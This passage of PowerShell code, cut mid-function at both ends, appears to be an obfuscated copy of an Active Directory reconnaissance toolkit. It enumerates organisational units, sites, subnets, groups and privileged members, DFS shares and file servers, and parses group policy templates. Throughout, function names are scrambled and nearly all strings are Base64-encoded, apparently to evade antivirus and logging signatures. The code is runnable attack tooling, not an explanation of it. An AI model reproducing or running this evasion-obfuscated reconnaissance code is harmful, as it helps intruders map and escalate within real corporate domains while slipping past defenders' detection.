                $OUSearcher.filter=$ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAAmACgAbwBiAGoAZQBjAHQAQwBhAHQAZQBnAG8AcgB5AD0AbwByAGcAYQBuAGkAegBhAHQAaQBvAG4AYQBsAFUAbgBpAHQAKQAoAG4AYQBtAGUAPQAkAE8AVQBOAGEAbQBlACkAKABnAHAAbABpAG4AawA9ACoAJABHAFUASQBEACoAKQApAA==')))
            }
            else {
                $OUSearcher.filter=$ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAAmACgAbwBiAGoAZQBjAHQAQwBhAHQAZQBnAG8AcgB5AD0AbwByAGcAYQBuAGkAegBhAHQAaQBvAG4AYQBsAFUAbgBpAHQAKQAoAG4AYQBtAGUAPQAkAE8AVQBOAGEAbQBlACkAKQA=')))
            }
            $OUSearcher.FindAll() | ? {$_} | % {
                if ($FullData) {
                    HaleCiteOzoos -Properties $_.Properties
                }
                else { 
                    $_.properties.adspath
                }
            }
        }
    }
}
function OutbaGenchNother {
    [CmdletBinding()]
    Param (
        [Parameter(ValueFromPipeline=$True)]
        [String]
        $SiteName = "*",
        [String]
        $Domain,
        [String]
        $DomainController,
        [String]
        $ADSpath,
        [String]
        $GUID,
        [Switch]
        $FullData,
        [ValidateRange(1,10000)] 
        [Int]
        $PageSize = 200
    )
    begin {
        $SiteSearcher = SuprajesUnderAganger -ADSpath $ADSpath -Domain $Domain -DomainController $DomainController -ADSprefix $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBOAD0AUwBpAHQAZQBzACwAQwBOAD0AQwBvAG4AZgBpAGcAdQByAGEAdABpAG8AbgA='))) -PageSize $PageSize
    }
    process {
        if($SiteSearcher) {
            if ($GUID) {
                $SiteSearcher.filter=$ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAAmACgAbwBiAGoAZQBjAHQAQwBhAHQAZQBnAG8AcgB5AD0AcwBpAHQAZQApACgAbgBhAG0AZQA9ACQAUwBpAHQAZQBOAGEAbQBlACkAKABnAHAAbABpAG4AawA9ACoAJABHAFUASQBEACoAKQApAA==')))
            }
            else {
                $SiteSearcher.filter=$ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAAmACgAbwBiAGoAZQBjAHQAQwBhAHQAZQBnAG8AcgB5AD0AcwBpAHQAZQApACgAbgBhAG0AZQA9ACQAUwBpAHQAZQBOAGEAbQBlACkAKQA=')))
            }
            try {
                $SiteSearcher.FindAll() | ? {$_} | % {
                    if ($FullData) {
                        HaleCiteOzoos -Properties $_.Properties
                    }
                    else {
                        $_.properties.name
                    }
                }
            }
            catch {
                Write-Warning $_
            }
        }
    }
}
function InsusePandsDor {
    [CmdletBinding()]
    Param (
        [Parameter(ValueFromPipeline=$True)]
        [String]
        $SiteName = "*",
        [String]
        $Domain,
        [String]
        $ADSpath,
        [String]
        $DomainController,
        [Switch]
        $FullData,
        [ValidateRange(1,10000)] 
        [Int]
        $PageSize = 200
    )
    begin {
        $SubnetSearcher = SuprajesUnderAganger -Domain $Domain -DomainController $DomainController -ADSpath $ADSpath -ADSprefix $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBOAD0AUwB1AGIAbgBlAHQAcwAsAEMATgA9AFMAaQB0AGUAcwAsAEMATgA9AEMAbwBuAGYAaQBnAHUAcgBhAHQAaQBvAG4A'))) -PageSize $PageSize
    }
    process {
        if($SubnetSearcher) {
            $SubnetSearcher.filter=$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAAmACgAbwBiAGoAZQBjAHQAQwBhAHQAZQBnAG8AcgB5AD0AcwB1AGIAbgBlAHQAKQApAA==')))
            try {
                $SubnetSearcher.FindAll() | ? {$_} | % {
                    if ($FullData) {
                        HaleCiteOzoos -Properties $_.Properties | ? { $_.siteobject -match $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBOAD0AJABTAGkAdABlAE4AYQBtAGUA'))) }
                    }
                    else {
                        if ( ($SiteName -and ($_.properties.siteobject -match $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBOAD0AJABTAGkAdABlAE4AYQBtAGUALAA='))))) -or ($SiteName -eq '*')) {
                            $SubnetProperties = @{
                                'Subnet' = $_.properties.name[0]
                            }
                            try {
                                $SubnetProperties[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHQAZQA=')))] = ($_.properties.siteobject[0]).split(",")[0]
                            }
                            catch {
                                $SubnetProperties[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHQAZQA=')))] = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQByAHIAbwByAA==')))
                            }
                            New-Object -TypeName PSObject -Property $SubnetProperties                 
                        }
                    }
                }
            }
            catch {
                Write-Warning $_
            }
        }
    }
}
function AngalvusPullyApilace {
    param(
        [String]
        $Domain
    )
    $FoundDomain = PrectusEmbakedTects -Domain $Domain
    if($FoundDomain) {
        $PrimaryDC = $FoundDomain.PdcRoleOwner
        $PrimaryDCSID = (GrochoniIncunnerMoustic -Domain $Domain -ComputerName $PrimaryDC -FullData).objectsid
        $Parts = $PrimaryDCSID.split("-")
        $Parts[0..($Parts.length -2)] -join "-"
    }
}
function SolematePallyCommixed {
    [CmdletBinding()]
    param(
        [Parameter(ValueFromPipeline=$True)]
        [String]
        $GroupName = '*',
        [String]
        $SID,
        [String]
        $UserName,
        [String]
        $Filter,
        [String]
        $Domain,
        [String]
        $DomainController,
        [String]
        $ADSpath,
        [Switch]
        $AdminCount,
        [Switch]
        $FullData,
        [Switch]
        $RawSids,
        [ValidateRange(1,10000)] 
        [Int]
        $PageSize = 200
    )
    begin {
        $GroupSearcher = SuprajesUnderAganger -Domain $Domain -DomainController $DomainController -ADSpath $ADSpath -PageSize $PageSize
    }
    process {
        if($GroupSearcher) {
            if($AdminCount) {
                Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBoAGUAYwBrAGkAbgBnACAAZgBvAHIAIABhAGQAbQBpAG4AQwBvAHUAbgB0AD0AMQA=')))
                $Filter += $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABhAGQAbQBpAG4AYwBvAHUAbgB0AD0AMQApAA==')))
            }
            if ($UserName) {
                $User = LatedCoidsuckRogues -SamAccountName $UserName -Domain $Domain -DomainController $DomainController -ReturnRaw -PageSize $PageSize
                $UserDirectoryEntry = $User.GetDirectoryEntry()
                $UserDirectoryEntry.RefreshCache($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dABvAGsAZQBuAEcAcgBvAHUAcABzAA=='))))
                $UserDirectoryEntry.TokenGroups | Foreach-Object {
                    $GroupSid = (New-Object System.Security.Principal.SecurityIdentifier($_,0)).Value
                    if(!($GroupSid -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XgBTAC0AMQAtADUALQAzADIALQA1ADQANQB8AC0ANQAxADMAJAA='))))) {
                        if($FullData) {
                            LatedCoidsuckRogues -SID $GroupSid -PageSize $PageSize
                        }
                        else {
                            if($RawSids) {
                                $GroupSid
                            }
                            else {
                                ElminutColatCably $GroupSid
                            }
                        }
                    }
                }
            }
            else {
                if ($SID) {
                    $GroupSearcher.filter = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAAmACgAbwBiAGoAZQBjAHQAQwBhAHQAZQBnAG8AcgB5AD0AZwByAG8AdQBwACkAKABvAGIAagBlAGMAdABTAEkARAA9ACQAUwBJAEQAKQAkAEYAaQBsAHQAZQByACkA')))
                }
                else {
                    $GroupSearcher.filter = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAAmACgAbwBiAGoAZQBjAHQAQwBhAHQAZQBnAG8AcgB5AD0AZwByAG8AdQBwACkAKABuAGEAbQBlAD0AJABHAHIAbwB1AHAATgBhAG0AZQApACQARgBpAGwAdABlAHIAKQA=')))
                }
                $GroupSearcher.FindAll() | ? {$_} | % {
                    if ($FullData) {
                        HaleCiteOzoos -Properties $_.Properties
                    }
                    else {
                        $_.properties.samaccountname
                    }
                }
            }
        }
    }
}
function EspeiPersBathly {
    [CmdletBinding()]
    param(
        [Parameter(ValueFromPipeline=$True)]
        [String]
        $GroupName,
        [String]
        $SID,
        [String]
        $Domain = (PrectusEmbakedTects).Name,
        [String]
        $DomainController,
        [String]
        $ADSpath,
        [Switch]
        $FullData,
        [Switch]
        $Recurse,
        [Switch]
        $UseMatchingRule,
        [ValidateRange(1,10000)] 
        [Int]
        $PageSize = 200
    )
    begin {
        $GroupSearcher = SuprajesUnderAganger -Domain $Domain -DomainController $DomainController -ADSpath $ADSpath -PageSize $PageSize
        if(!$DomainController) {
            $DomainController = ((PrectusEmbakedTects).PdcRoleOwner).Name
        }
    }
    process {
        if ($GroupSearcher) {
            if ($Recurse -and $UseMatchingRule) {
                if ($GroupName) {
                    $Group = SolematePallyCommixed -GroupName $GroupName -Domain $Domain -FullData -PageSize $PageSize
                }
                elseif ($SID) {
                    $Group = SolematePallyCommixed -SID $SID -Domain $Domain -FullData -PageSize $PageSize
                }
                else {
                    $SID = (AngalvusPullyApilace -Domain $Domain) + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LQA1ADEAMgA=')))
                    $Group = SolematePallyCommixed -SID $SID -Domain $Domain -FullData -PageSize $PageSize
                }
                $GroupDN = $Group.distinguishedname
                $GroupFoundName = $Group.name
                if ($GroupDN) {
                    $GroupSearcher.filter = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAAmACgAcwBhAG0AQQBjAGMAbwB1AG4AdABUAHkAcABlAD0AOAAwADUAMwAwADYAMwA2ADgAKQAoAG0AZQBtAGIAZQByAG8AZgA6ADEALgAyAC4AOAA0ADAALgAxADEAMwA1ADUANgAuADEALgA0AC4AMQA5ADQAMQA6AD0AJABHAHIAbwB1AHAARABOACkAJABGAGkAbAB0AGUAcgApAA==')))
                    $GroupSearcher.PropertiesToLoad.AddRange(($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZABpAHMAdABpAG4AZwB1AGkAcwBoAGUAZABOAGEAbQBlAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBhAG0AYQBjAGMAbwB1AG4AdAB0AHkAcABlAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bABhAHMAdABsAG8AZwBvAG4A'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bABhAHMAdABsAG8AZwBvAG4AdABpAG0AZQBzAHQAYQBtAHAA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZABzAGMAbwByAGUAcAByAG8AcABhAGcAYQB0AGkAbwBuAGQAYQB0AGEA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bwBiAGoAZQBjAHQAcwBpAGQA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dwBoAGUAbgBjAHIAZQBhAHQAZQBkAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YgBhAGQAcABhAHMAcwB3AG8AcgBkAHQAaQBtAGUA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBjAGMAbwB1AG4AdABlAHgAcABpAHIAZQBzAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aQBzAGMAcgBpAHQAaQBjAGEAbABzAHkAcwB0AGUAbQBvAGIAagBlAGMAdAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bgBhAG0AZQA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dQBzAG4AYwBoAGEAbgBnAGUAZAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bwBiAGoAZQBjAHQAYwBhAHQAZQBnAG8AcgB5AA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZABlAHMAYwByAGkAcAB0AGkAbwBuAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YwBvAGQAZQBwAGEAZwBlAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aQBuAHMAdABhAG4AYwBlAHQAeQBwAGUA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YwBvAHUAbgB0AHIAeQBjAG8AZABlAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZABpAHMAdABpAG4AZwB1AGkAcwBoAGUAZABuAGEAbQBlAA=='))),'cn',$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBkAG0AaQBuAGMAbwB1AG4AdAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bABvAGcAbwBuAGgAbwB1AHIAcwA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bwBiAGoAZQBjAHQAYwBsAGEAcwBzAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bABvAGcAbwBuAGMAbwB1AG4AdAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dQBzAG4AYwByAGUAYQB0AGUAZAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dQBzAGUAcgBhAGMAYwBvAHUAbgB0AGMAbwBuAHQAcgBvAGwA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bwBiAGoAZQBjAHQAZwB1AGkAZAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cAByAGkAbQBhAHIAeQBnAHIAbwB1AHAAaQBkAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bABhAHMAdABsAG8AZwBvAGYAZgA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBhAG0AYQBjAGMAbwB1AG4AdABuAGEAbQBlAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YgBhAGQAcAB3AGQAYwBvAHUAbgB0AA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dwBoAGUAbgBjAGgAYQBuAGcAZQBkAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQBlAG0AYgBlAHIAbwBmAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cAB3AGQAbABhAHMAdABzAGUAdAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBkAHMAcABhAHQAaAA=')))))
                    $Members = $GroupSearcher.FindAll()
                    $GroupFoundName = $GroupName
                }
                else {
                    Write-Error $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AIABmAGkAbgBkACAARwByAG8AdQBwAA==')))
                }
            }
            else {
                if ($GroupName) {
                    $GroupSearcher.filter = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAAmACgAbwBiAGoAZQBjAHQAQwBhAHQAZQBnAG8AcgB5AD0AZwByAG8AdQBwACkAKABuAGEAbQBlAD0AJABHAHIAbwB1AHAATgBhAG0AZQApACQARgBpAGwAdABlAHIAKQA=')))
                }
                elseif ($SID) {
                    $GroupSearcher.filter = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAAmACgAbwBiAGoAZQBjAHQAQwBhAHQAZQBnAG8AcgB5AD0AZwByAG8AdQBwACkAKABvAGIAagBlAGMAdABTAEkARAA9ACQAUwBJAEQAKQAkAEYAaQBsAHQAZQByACkA')))
                }
                else {
                    $SID = (AngalvusPullyApilace -Domain $Domain) + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LQA1ADEAMgA=')))
                    $GroupSearcher.filter = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAAmACgAbwBiAGoAZQBjAHQAQwBhAHQAZQBnAG8AcgB5AD0AZwByAG8AdQBwACkAKABvAGIAagBlAGMAdABTAEkARAA9ACQAUwBJAEQAKQAkAEYAaQBsAHQAZQByACkA')))
                }
                $GroupSearcher.FindAll() | % {
                    try {
                        if (!($_) -or !($_.properties) -or !($_.properties.name)) { continue }
                        $GroupFoundName = $_.properties.name[0]
                        $Members = @()
                        if ($_.properties.member.Count -eq 0) {
                            $Finished = $False
                            $Bottom = 0
                            $Top = 0
                            while(!$Finished) {
                                $Top = $Bottom + 1499
                                $MemberRange=$ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQBlAG0AYgBlAHIAOwByAGEAbgBnAGUAPQAkAEIAbwB0AHQAbwBtAC0AJABUAG8AcAA=')))
                                $Bottom += 1500
                                $GroupSearcher.PropertiesToLoad.Clear()
                                [void]$GroupSearcher.PropertiesToLoad.Add($ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABNAGUAbQBiAGUAcgBSAGEAbgBnAGUA'))))
                                try {
                                    $Result = $GroupSearcher.FindOne()
                                    if ($Result) {
                                        $RangedProperty = $_.Properties.PropertyNames -like $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQBlAG0AYgBlAHIAOwByAGEAbgBnAGUAPQAqAA==')))
                                        $Results = $_.Properties.item($RangedProperty)
                                        if ($Results.count -eq 0) {
                                            $Finished = $True
                                        }
                                        else {
                                            $Results | % {
                                                $Members += $_
                                            }
                                        }
                                    }
                                    else {
                                        $Finished = $True
                                    }
                                } 
                                catch [System.Management.Automation.MethodInvocationException] {
                                    $Finished = $True
                                }
                            }
                        } 
                        else {
                            $Members = $_.properties.member
                        }
                    } 
                    catch {
                        Write-Verbose $_
                    }
                }
            }
            $Members | ? {$_} | % {
                if ($Recurse -and $UseMatchingRule) {
                    $Properties = $_.Properties
                } 
                else {
                    if($DomainController) {
                        $Result = [adsi]$ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUAA6AC8ALwAkAEQAbwBtAGEAaQBuAEMAbwBuAHQAcgBvAGwAbABlAHIALwAkAF8A')))
                    }
                    else {
                        $Result = [adsi]$ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUAA6AC8ALwAkAF8A')))
                    }
                    if($Result){
                        $Properties = $Result.Properties
                    }
                }
                if($Properties) {
                    if($Properties.samaccounttype -notmatch $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('OAAwADUAMwAwADYAMwA2ADgA')))) {
                        $IsGroup = $True
                    }
                    else {
                        $IsGroup = $False
                    }
                    if ($FullData) {
                        $GroupMember = HaleCiteOzoos -Properties $Properties
                    }
                    else {
                        $GroupMember = New-Object PSObject
                    }
                    $GroupMember | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwByAG8AdQBwAEQAbwBtAGEAaQBuAA=='))) $Domain
                    $GroupMember | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwByAG8AdQBwAE4AYQBtAGUA'))) $GroupFoundName
                    try {
                        $MemberDN = $Properties.distinguishedname[0]
                        $MemberDomain = $MemberDN.subString($MemberDN.IndexOf($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABDAD0A'))))) -replace $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABDAD0A'))),'' -replace ',','.'
                    }
                    catch {
                        $MemberDN = $Null
                        $MemberDomain = $Null
                    }
                    if ($Properties.samaccountname) {
                        $MemberName = $Properties.samaccountname[0]
                    } 
                    else {
                        try {
                            $MemberName = ElminutColatCably $Properties.cn[0]
                        }
                        catch {
                            $MemberName = $Properties.cn
                        }
                    }
                    if($Properties.objectSid) {
                        $MemberSid = ((New-Object System.Security.Principal.SecurityIdentifier $Properties.objectSid[0],0).Value)
                    }
                    else {
                        $MemberSid = $Null
                    }
                    $GroupMember | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBlAG0AYgBlAHIARABvAG0AYQBpAG4A'))) $MemberDomain
                    $GroupMember | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBlAG0AYgBlAHIATgBhAG0AZQA='))) $MemberName
                    $GroupMember | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBlAG0AYgBlAHIAUwBpAGQA'))) $MemberSid
                    $GroupMember | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBzAEcAcgBvAHUAcAA='))) $IsGroup
                    $GroupMember | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBlAG0AYgBlAHIARABOAA=='))) $MemberDN
                    $GroupMember
                    if ($Recurse -and !$UseMatchingRule -and $IsGroup -and $MemberName) {
                        EspeiPersBathly -FullData -Domain $MemberDomain -DomainController $DomainController -GroupName $MemberName -Recurse -PageSize $PageSize
                    }
                }
            }
        }
    }
}
function LydancyUnderrySchronial {
    [CmdletBinding()]
    param(
        [String]
        $Domain,
        [String]
        $DomainController,
        [String[]]
        $TargetUsers,
        [ValidateRange(1,10000)] 
        [Int]
        $PageSize = 200
    )
    function PumpKnotiNetal {
        param([String]$Path)
        if ($Path -and ($Path.split("\\").Count -ge 3)) {
            $Temp = $Path.split("\\")[2]
            if($Temp -and ($Temp -ne '')) {
                $Temp
            }
        }
    }
    BilinessArcallyBorn -Domain $Domain -DomainController $DomainController -PageSize $PageSize | ? {$_} | ? {
            if($TargetUsers) {
                $TargetUsers -Match $_.samAccountName
            }
            else { $True } 
        } | Foreach-Object {
            if($_.homedirectory) {
                PumpKnotiNetal($_.homedirectory)
            }
            if($_.scriptpath) {
                PumpKnotiNetal($_.scriptpath)
            }
            if($_.profilepath) {
                PumpKnotiNetal($_.profilepath)
            }
        } | ? {$_} | sort -Unique
}
function ThersReassireIdo {
    [CmdletBinding()]
    param(
        [String]
        [ValidateSet("All","V1","1","V2","2")]
        $Version = "All",
        [String]
        $Domain,
        [String]
        $DomainController,
        [String]
        $ADSpath,
        [ValidateRange(1,10000)] 
        [Int]
        $PageSize = 200
    )
    function TyperforsEposismMastine {
        [CmdletBinding()]
        param(
            [String]
            $Domain,
            [String]
            $DomainController,
            [String]
            $ADSpath,
            [ValidateRange(1,10000)] 
            [Int]
            $PageSize = 200
        )
        $DFSsearcher = SuprajesUnderAganger -Domain $Domain -DomainController $DomainController -ADSpath $ADSpath -PageSize $PageSize
        if($DFSsearcher) {
            $DFSshares = @()
            $DFSsearcher.filter = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAAmACgAbwBiAGoAZQBjAHQAQwBsAGEAcwBzAD0AZgBUAEQAZgBzACkAKQA=')))
            try {
                $DFSSearcher.FindAll() | ? {$_} | % {
                    $Properties = $_.Properties
                    $RemoteNames = $Properties.remoteservername
                    $DFSshares += $RemoteNames | % {
                        try {
                            if ( $_.Contains('\') ) {
                                New-Object -TypeName PSObject -Property @{'Name'=$Properties.name[0];'RemoteServerName'=$_.split("\")[2]}
                            }
                        }
                        catch {
                            Write-Debug $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQByAHIAbwByACAAaQBuACAAcABhAHIAcwBpAG4AZwAgAEQARgBTACAAcwBoAGEAcgBlACAAOgAgACQAXwA=')))
                        }
                    }
                }
            }
            catch {
                Write-Warning $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBlAHQALQBEAEYAUwBzAGgAYQByAGUAVgAyACAAZQByAHIAbwByACAAOgAgACQAXwA=')))
            }
            $DFSshares | sort -Property $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAG0AbwB0AGUAUwBlAHIAdgBlAHIATgBhAG0AZQA=')))
        }
    }
    function TanticGambiradTaxillate {
        [CmdletBinding()]
        param(
            [String]
            $Domain,
            [String]
            $DomainController,
            [String]
            $ADSpath,
            [ValidateRange(1,10000)] 
            [Int]
            $PageSize = 200
        )
        $DFSsearcher = SuprajesUnderAganger -Domain $Domain -DomainController $DomainController -ADSpath $ADSpath -PageSize $PageSize
        if($DFSsearcher) {
            $DFSshares = @()
            $DFSsearcher.filter = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAAmACgAbwBiAGoAZQBjAHQAQwBsAGEAcwBzAD0AbQBzAEQARgBTAC0ATABpAG4AawB2ADIAKQApAA==')))
            $DFSSearcher.PropertiesToLoad.AddRange(($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQBzAGQAZgBzAC0AbABpAG4AawBwAGEAdABoAHYAMgA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQBzAEQARgBTAC0AVABhAHIAZwBlAHQATABpAHMAdAB2ADIA')))))
            try {
                $DFSSearcher.FindAll() | ? {$_} | % {
                    $Properties = $_.Properties
                    $target_list = $Properties.'msdfs-targetlistv2'[0]
                    $xml = [xml][System.Text.Encoding]::Unicode.GetString($target_list[2..($target_list.Length-1)])
                    $DFSshares += $xml.targets.ChildNodes | % {
                        try {
                            $Target = $_.InnerText
                            if ( $Target.Contains('\') ) {
                                $DFSroot = $Target.split("\")[3]
                                $ShareName = $Properties.'msdfs-linkpathv2'[0]
                                New-Object -TypeName PSObject -Property @{'Name'=$ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABEAEYAUwByAG8AbwB0ACQAUwBoAGEAcgBlAE4AYQBtAGUA')));'RemoteServerName'=$Target.split("\")[2]}
                            }
                        }
                        catch {
                            Write-Debug $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQByAHIAbwByACAAaQBuACAAcABhAHIAcwBpAG4AZwAgAHQAYQByAGcAZQB0ACAAOgAgACQAXwA=')))
                        }
                    }
                }
            }
            catch {
                Write-Warning $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBlAHQALQBEAEYAUwBzAGgAYQByAGUAVgAyACAAZQByAHIAbwByACAAOgAgACQAXwA=')))
            }
            $DFSshares | sort -Unique -Property $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAG0AbwB0AGUAUwBlAHIAdgBlAHIATgBhAG0AZQA=')))
        }
    }
    $DFSshares = @()
    if ( ($Version -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBsAGwA')))) -or ($Version.endsWith("1")) ) {
        $DFSshares += TyperforsEposismMastine -Domain $Domain -DomainController $DomainController -ADSpath $ADSpath -PageSize $PageSize
    }
    if ( ($Version -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBsAGwA')))) -or ($Version.endsWith("2")) ) {
        $DFSshares += TanticGambiradTaxillate -Domain $Domain -DomainController $DomainController -ADSpath $ADSpath -PageSize $PageSize
    }
    $DFSshares | sort -Property $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAG0AbwB0AGUAUwBlAHIAdgBlAHIATgBhAG0AZQA=')))
}
function AnthEggaptesPleaf {
    [CmdletBinding()]
    Param (
        [Parameter(Mandatory=$True, ValueFromPipeline=$True)]
        [String]
        $GptTmplPath,
        [Switch]
        $UsePSDrive
    )
    begin {
        if($UsePSDrive) {
            $Parts = $GptTmplPath.split('\')
            $FolderPath = $Parts[0..($Parts.length-2)] -join '\'
            $FilePath = $Parts[-1]
            $RandDrive = ($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBiAGMAZABlAGYAZwBoAGkAagBrAGwAbQBuAG8AcABxAHIAcwB0AHUAdgB3AHgAeQB6AA=='))).ToCharArray() | Get-Random -Count 7) -join ''
            Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBvAHUAbgB0AGkAbgBnACAAcABhAHQAaAAgACQARwBwAHQAVABtAHAAbABQAGEAdABoACAAdQBzAGkAbgBnACAAYQAgAHQAZQBtAHAAIABQAFMARAByAGkAdgBlACAAYQB0ACAAJABSAGEAbgBkAEQAcgBpAHYAZQA=')))
            try {
                $Null = ndr -Name $RandDrive -PSProvider FileSystem -Root $FolderPath  -ErrorAction Stop
            }
            catch {
                Write-Debug $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQByAHIAbwByACAAbQBvAHUAbgB0AGkAbgBnACAAcABhAHQAaAAgACQARwBwAHQAVABtAHAAbABQAGEAdABoACAAOgAgACQAXwA=')))
                return $Null
            }
            $GptTmplPath = $RandDrive + ":\" + $FilePath
        } 
    }
    process {
        $SectionName = ''
        $SectionsTemp = @{}
        $SectionsFinal = @{}
        try {
            if(Test-Path $GptTmplPath) {
                Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABhAHIAcwBpAG4AZwAgACQARwBwAHQAVABtAHAAbABQAGEAdABoAA==')))
                gc $GptTmplPath -ErrorAction Stop | Foreach-Object {
                    if ($_ -match '\[') {
                        $SectionName = $_.trim('[]') -replace ' ',''
                    }
                    elseif($_ -match '=') {
                        $Parts = $_.split('=')
                        $PropertyName = $Parts[0].trim()
                        $PropertyValues = $Parts[1].trim()
                        if($PropertyValues -match ',') {
